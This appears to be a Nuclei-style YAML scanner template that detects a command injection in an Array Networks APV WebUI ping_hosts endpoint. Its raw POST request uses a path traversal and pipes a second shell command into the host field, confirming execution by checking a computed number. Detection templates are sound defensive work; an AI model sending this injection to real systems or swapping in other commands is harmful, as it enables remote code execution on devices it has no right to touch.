id: poc-yaml-arraynetworks-apv-webui
info:
  name: APV WebUI ping_hosts Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    Detects a command injection vulnerability in the APV WebUI ping_hosts endpoint that allows arbitrary command execution.

variables:
  t1: "{{rand_int(111000, 999000)}}"
  t2: "{{rand_int(10, 100)}}"
  t3: "{{to_number(t1) - to_number(t2)}}"

http:
  - raw:
      - |
        POST /restapi/../rest/ping_hosts HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ["127.0.0.1| echo `expr {{t1}} - {{t2}}` received 2 3 4"]=1
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "\"receive\""
          - "\"send\""
      - type: word
        part: body
        words:
          - "{{t3}}"
      - type: status
        status:
          - 200
